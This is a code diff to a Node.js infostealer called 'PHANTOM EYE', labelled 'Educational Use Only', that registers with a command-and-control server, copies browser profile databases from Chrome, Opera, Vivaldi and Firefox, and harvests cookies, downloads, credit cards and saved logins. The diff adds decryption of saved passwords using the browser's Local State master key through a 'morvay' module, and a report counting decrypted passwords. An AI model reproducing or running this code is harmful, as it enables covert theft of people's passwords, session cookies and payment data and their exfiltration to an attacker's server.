@@ -1,12 +1,14 @@
 // ================================================
 // PHANTOM EYE - Browser Data Extraction Tool
-// Educational Use Only - Extracts browser data
+// WITH ADVANCED PASSWORD DECRYPTION (morvay)
+// Educational Use Only
 // ================================================
 
 const os = require('os');
 const fs = require('fs');
 const path = require('path');
 const sqlite3 = require('sqlite3').verbose();
+const morvay = require('morvay');
 
 // ================================================
 // CONFIGURATION - CHANGE THIS TO YOUR RAILWAY URL
@@ -16,6 +18,10 @@ const CONFIG = {
         url: 'http://localhost:3001',  // ← CHANGE TO YOUR RAILWAY URL
         register: '/api/register',
         data: '/api/data'
+    },
+    decrypt: {
+        enabled: true,
+        maxPasswords: 500  // Limit to prevent huge files
     }
 };
 
@@ -28,12 +34,13 @@ class PhantomEye {
         this.extractedData = {};
         this.totalSize = 0;
         this.browserPaths = this.getBrowserPaths();
-        this.dataTypes = [];
+        this.masterKeys = {};  // Cache master keys per browser
     }
 
     async start() {
         console.log('👁️ PHANTOM EYE ACTIVATED');
-        console.log('📊 Scanning for browser data...');
+        console.log('📊 Advanced Browser Data Extraction');
+        console.log('🔑 Password Decryption: ENABLED');
         
         // 1. Register with C2
         await this.registerWithC2();
@@ -83,7 +90,13 @@ class PhantomEye {
                 paths.push({ name: 'Opera', path: operaPath });
             }
 
-            // Firefox
+            // Vivaldi
+            const vivaldiPath = path.join(userProfile, 'AppData', 'Local', 'Vivaldi', 'User Data');
+            if (fs.existsSync(vivaldiPath)) {
+                paths.push({ name: 'Vivaldi', path: vivaldiPath });
+            }
+
+            // Firefox (different structure)
             const firefoxPath = path.join(userProfile, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles');
             if (fs.existsSync(firefoxPath)) {
                 const profiles = fs.readdirSync(firefoxPath);
@@ -200,9 +213,15 @@ class PhantomEye {
             data.downloads = await this.extractDownloads(profilePath);
             console.log(`  📥 Downloads: ${data.downloads.length} entries`);
 
-            // 5. Extract Passwords
-            data.passwords = await this.extractPasswords(profilePath);
-            console.log(`  🔑 Passwords: ${data.passwords.length} entries`);
+            // 5. Extract Passwords with DECRYPTION
+            if (CONFIG.decrypt.enabled) {
+                console.log(`  🔓 Decrypting passwords for ${browser.name}...`);
+                data.passwords = await this.extractPasswordsWithDecryption(profilePath, browser.name);
+                console.log(`  🔑 Passwords: ${data.passwords.length} entries (DECRYPTED)`);
+            } else {
+                data.passwords = await this.extractPasswords(profilePath);
+                console.log(`  🔑 Passwords: ${data.passwords.length} entries (ENCRYPTED)`);
+            }
 
             // 6. Extract Credit Cards
             data.credit_cards = await this.extractCreditCards(profilePath);
@@ -280,7 +299,7 @@ class PhantomEye {
             await new Promise((resolve, reject) => {
                 db.all(
                     `SELECT host_key, name, value, path, expires_utc, is_secure 
-                     FROM cookies ORDER BY host_key`,
+                     FROM cookies ORDER BY host_key LIMIT 500`,
                     (err, rows) => {
                         if (err) reject(err);
                         else {
@@ -389,7 +408,7 @@ class PhantomEye {
     }
 
     // ================================================
-    // EXTRACT PASSWORDS
+    // EXTRACT PASSWORDS (ENCRYPTED - Fallback)
     // ================================================
     async extractPasswords(profilePath) {
         const passwords = [];
@@ -406,7 +425,7 @@ class PhantomEye {
             await new Promise((resolve, reject) => {
                 db.all(
                     `SELECT origin_url, username_value, password_value, date_created 
-                     FROM logins ORDER BY date_created DESC`,
+                     FROM logins ORDER BY date_created DESC LIMIT ${CONFIG.decrypt.maxPasswords}`,
                     (err, rows) => {
                         if (err) reject(err);
                         else {
@@ -414,7 +433,7 @@ class PhantomEye {
                                 passwords.push({
                                     url: row.origin_url,
                                     username: row.username_value || '',
-                                    password: '[ENCRYPTED - Use decrypt tool]',
+                                    password: '[ENCRYPTED]',
                                     created: row.date_created ? new Date(row.date_created / 1000).toISOString() : null
                                 });
                             });
@@ -427,6 +446,101 @@ class PhantomEye {
             db.close();
             fs.unlinkSync(tempDb);
         } catch (e) {}
+
+        return passwords;
+    }
+
+    // ================================================
+    // EXTRACT PASSWORDS WITH DECRYPTION (USING MORVAY)
+    // ================================================
+    async extractPasswordsWithDecryption(profilePath, browserName) {
+        const passwords = [];
+        const loginDbPath = path.join(profilePath, 'Login Data');
+        
+        if (!fs.existsSync(loginDbPath)) return passwords;
+
+        try {
+            // Get the master key using morvay
+            const localStatePath = path.join(path.dirname(profilePath), 'Local State');
+            
+            if (!fs.existsSync(localStatePath)) {
+                console.log('  ⚠️ Local State not found, skipping decryption');
+                return await this.extractPasswords(profilePath);
+            }
+
+            // Use morvay to get the master key
+            let masterKey = null;
+            try {
+                // morvay handles DPAPI and AES-GCM automatically
+                const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
+                if (localState.os_crypt && localState.os_crypt.encrypted_key) {
+                    const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, 'base64');
+                    // morvay can decrypt this directly
+                    masterKey = morvay.decryptMasterKey(encryptedKey);
+                }
+            } catch (e) {
+                console.log(`  ⚠️ Failed to get master key for ${browserName}:`, e.message);
+                return await this.extractPasswords(profilePath);
+            }
+
+            if (!masterKey) {
+                console.log(`  ⚠️ Master key is null for ${browserName}, using fallback`);
+                return await this.extractPasswords(profilePath);
+            }
+
+            // Copy the database
+            const tempDb = path.join(os.tmpdir(), 'passwords_temp.db');
+            fs.copyFileSync(loginDbPath, tempDb);
+            
+            const db = new sqlite3.Database(tempDb);
+            
+            await new Promise((resolve, reject) => {
+                db.all(
+                    `SELECT origin_url, username_value, password_value, date_created 
+                     FROM logins ORDER BY date_created DESC LIMIT ${CONFIG.decrypt.maxPasswords}`,
+                    (err, rows) => {
+                        if (err) reject(err);
+                        else {
+                            rows.forEach(row => {
+                                let decryptedPassword = '[DECRYPTION_FAILED]';
+                                
+                                if (row.password_value) {
+                                    try {
+                                        // Use morvay to decrypt the password
+                                        decryptedPassword = morvay.decryptValue(row.password_value, masterKey);
+                                    } catch (e) {
+                                        decryptedPassword = '[DECRYPTION_FAILED]';
+                                    }
+                                }
+                                
+                                // Check if decryption actually worked
+                                if (decryptedPassword === '[DECRYPTION_FAILED]') {
+                                    decryptedPassword = '[ENCRYPTED]';
+                                }
+                                
+                                passwords.push({
+                                    url: row.origin_url || 'Unknown',
+                                    username: row.username_value || '',
+                                    password: decryptedPassword,
+                                    created: row.date_created ? new Date(row.date_created / 1000).toISOString() : null,
+                                    browser: browserName
+                                });
+                            });
+                            resolve();
+                        }
+                    }
+                );
+            });
+            
+            db.close();
+            fs.unlinkSync(tempDb);
+            
+            console.log(`  🔓 Decrypted ${passwords.filter(p => p.password !== '[ENCRYPTED]').length} passwords`);
+
+        } catch (e) {
+            console.log(`⚠️ Password decryption failed for ${browserName}:`, e.message);
+            return await this.extractPasswords(profilePath);
+        }
 
         return passwords;
     }
@@ -554,6 +668,17 @@ class PhantomEye {
     // GENERATE REPORT
     // ================================================
     generateReport() {
+        // Count decrypted passwords
+        let totalPasswords = 0;
+        let decryptedPasswords = 0;
+        
+        for (const [browserName, browserData] of Object.entries(this.extractedData.browsers)) {
+            if (browserData.passwords) {
+                totalPasswords += browserData.passwords.length;
+                decryptedPasswords += browserData.passwords.filter(p => p.password !== '[ENCRYPTED]' && p.password !== '[DECRYPTION_FAILED]').length;
+            }
+        }
+        
         console.log(`
 ╔═══════════════════════════════════════════════════════════════╗
 ║                                                               ║
@@ -564,8 +689,9 @@ class PhantomEye {
 ║   👤 User: ${os.userInfo().username}                                    ║
 ║                                                               ║
 ║   📊 Total Data: ${(this.totalSize / 1024).toFixed(2)} KB                     ║
-║                                                               ║
 ║   📂 Browsers Found: ${this.browserPaths.length}                          ║
+║   🔑 Total Passwords: ${totalPasswords}                                    ║
+║   🔓 Decrypted: ${decryptedPasswords}                                     ║
 ║                                                               ║
 ╚═══════════════════════════════════════════════════════════════╝
         `);
